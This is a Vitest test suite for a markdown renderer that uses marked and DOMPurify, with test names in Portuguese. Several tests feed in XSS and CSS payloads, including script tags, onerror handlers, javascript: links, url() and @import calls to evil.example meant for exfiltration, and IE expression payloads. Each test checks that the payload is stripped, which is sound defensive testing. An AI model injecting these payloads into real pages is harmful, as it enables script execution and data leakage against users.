import { describe, it, expect } from 'vitest';
import { convert, escapeHtml } from '../../src/render/convert.js';

describe('convert (pipeline marked → DOMPurify)', () => {
  it('renderiza em negrito', () => {
    const html = convert('**negrito**');
    expect(html).toContain('<strong>negrito</strong>');
  });

  it('renderiza cabeçalho h1', () => {
    const html = convert('# Título');
    expect(html).toMatch(/<h1[^>]*>/);
    expect(html).toContain('Título');
    expect(html).toContain('</h1>');
  });

  it('sanitiza scripts (XSS bloqueado)', () => {
    const html = convert('<script>alert(1)</script>\n\n*ok*');
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('alert(1)');
    expect(html).toContain('<em>ok</em>');
  });

  it('sanitiza onclick em atributo', () => {
    const html = convert('<img src="x" onerror="alert(1)">');
    expect(html).not.toContain('onerror');
  });

  it('bloco mermaid vira <pre class="mermaid">', () => {
    const html = convert('```mermaid\ngraph TD\n  A --> B\n```');
    expect(html).toContain('<pre class="mermaid">');
    expect(html).toContain('graph TD');
  });

  it('bloco de código normal continua renderizado pelo marked', () => {
    const html = convert('```js\nconst a = 1;\n```');
    expect(html).toContain('const a = 1');
    expect(html).not.toContain('class="mermaid"');
  });

  it('escapeHtml escapa caracteres perigosos', () => {
    expect(escapeHtml('<img src="x">')).toBe('&lt;img src=&quot;x&quot;&gt;');
    expect(escapeHtml('a & b < c > d "e" \'f\'')).toBe(
      'a &amp; b &lt; c &gt; d &quot;e&quot; &#39;f&#39;',
    );
  });

  it('bloco mermaid escapa conteúdo HTML injetado', () => {
    const html = convert('```mermaid\ngraph TD\n  A --> B <script>alert(1)</script>\n```');
    expect(html).toContain('<pre class="mermaid">');
    expect(html).not.toContain('<script>');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('A --&gt; B');
  });

  it('comentário/atributo no bloco mermaid não escapa do <pre>', () => {
    const html = convert('```mermaid\nA --> B "><img src=x>\n```');
    expect(html).toContain('<pre class="mermaid">');
    expect(html).not.toContain('<img');
    // ">" é escapado (&gt;); aspas em texto são re-serializadas literais pelo
    // DOM após sanitização — o importante é que < / > impedem criar elemento.
    expect(html).toContain('&gt;&lt;img src=x&gt;');
  });

  it('tabela renderiza com célula', () => {
    const html = convert('| A | B |\n|---|---|\n| 1 | 2 |');
    expect(html).toContain('<td>1</td>');
  });

  it('cabeçalho ganha id slug (âncoras clicáveis)', () => {
    const html = convert('## Ênfase e formatação de texto');
    expect(html).toContain('<h2 id="enfase-e-formatacao-de-texto">');
  });

  it('cabeçalhos repetidos ganham sufixo numérico', () => {
    const html = convert('# Título\n\n# Título');
    expect(html).toContain('<h1 id="titulo">');
    expect(html).toContain('<h1 id="titulo-1">');
  });

  it('<!-- page-break --> vira divisor semântico de quebra de página', () => {
    const html = convert('Capítulo A\n\n<!-- page-break -->\n\nCapítulo B');
    expect(html).toContain('<div class="page-break"');
    expect(html).not.toContain('page-break -->');
  });

  it('comentário comum continua sendo removido pelo DOMPurify', () => {
    const html = convert('Olá\n\n<!-- notícia interna -->\n\nMundo');
    expect(html).not.toContain('<!--');
  });

  it('fórmula inline $...$ renderiza KaTeX', () => {
    const html = convert('A energia é $E=mc^2$ hoje.');
    expect(html).toContain('class="katex"');
    expect(html).not.toContain('$E=mc^2$');
  });

  it('fórmula em bloco $$...$$ renderiza KaTeX display', () => {
    const html = convert('Texto\n\n$$\n\\frac{a}{b}\n$$\n\nFim');
    expect(html).toContain('katex-display');
  });

  it('XSS dentro de fórmula é neutralizado', () => {
    const html = convert('$<script>alert(1)</script>$');
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('alert(1)</script>');
  });

  it('cifra dentro de código inline não vira fórmula', () => {
    const html = convert('Use `$x$` como literal.');
    expect(html).toContain('<code>');
    expect(html).not.toContain('katex');
  });

  it('link externo abre em nova aba com rel=noopener (B3)', () => {
    const html = convert('[site](https://example.com/)');
    expect(html).toContain('href="https://example.com/"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('link relativo e mailto preservam href sem target (B3)', () => {
    const relative = convert('[img](/image/Markdown-mark.svg)');
    expect(relative).toContain('href="/image/Markdown-mark.svg"');
    expect(relative).not.toContain('target=');

    const mailto = convert('[contato](mailto:a@b.c)');
    expect(mailto).toContain('href="mailto:a@b.c"');
    expect(mailto).not.toContain('target=');
  });

  it('schemes não permitidos perdem o href (B3)', () => {
    expect(convert('[x](tel:5511999)')).not.toContain('href=');
    expect(convert('[x](javascript:alert(1))')).not.toContain('href=');
  });
});

describe('M1 — atributo <style> perigoso', () => {
  it('remove style com position:fixed (UI redress sobre o editor)', () => {
    const html = convert('<div style="position:fixed;inset:0;background:#f00">x</div>');
    expect(html).not.toContain('position:fixed');
    expect(html).toContain('x');
  });

  it('remove style com position:sticky', () => {
    expect(convert('<div style="position: sticky;top:0">x</div>')).not.toContain('position:');
  });

  it('remove style com url() — exfiltração a cada render', () => {
    const html = convert('<span style="background:url(https://evil.example/pixel?d=1)">x</span>');
    expect(html).not.toContain('url(');
    expect(html).toContain('x');
  });

  it('remove payloads legados de IE (expression/behavior/-moz-binding)', () => {
    expect(convert('<div style="width:expression(alert(1))">x</div>')).not.toContain('expression');
    expect(convert('<div style="behavior:url(#t)">x</div>')).not.toContain('behavior');
    expect(convert('<div style="-moz-binding:url(x.xml)">x</div>')).not.toContain('-moz-binding');
  });

  it('mantém style inofensivo (cor, layout e o style inline do KaTeX)', () => {
    const benign = convert('<span style="color:red;font-weight:bold">x</span>');
    expect(benign).toContain('style="color:red;font-weight:bold"');

    const katex = convert('<div style="height:0.8em;position:absolute">x</div>');
    expect(katex).toContain('position:absolute');
  });

  it('mantém o style do KaTeX nas fórmulas renderizadas', () => {
    const html = convert('$E=mc^2$');
    expect(html).toContain('class="katex"');
    expect(html).toMatch(/<span[^>]*style="/);
  });

  it('remove <style> mesmo dentro de <svg> (@import executaria no documento)', () => {
    const html = convert('<svg><style>@import url("https://evil.example/x.css");</style></svg>');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('@import');
  });
});

describe('MathML — annotation-xml fica de fora', () => {
  it('mantém <math>/<semantics>/<annotation> escritos no markdown', () => {
    const html = convert(
      '<math><semantics><mi>x</mi><annotation encoding="application/x-tex">x</annotation></semantics></math>',
    );
    expect(html).toContain('<math>');
    expect(html).toContain('<annotation');
  });

  it('remove <annotation-xml encoding="text/html"> (único vetor de XSS da MathML)', () => {
    const html = convert(
      '<math><semantics><annotation-xml encoding="text/html"><b>oi</b></annotation-xml></semantics></math>',
    );
    expect(html).not.toContain('annotation-xml');
    expect(html).toContain('<math>');
  });
});
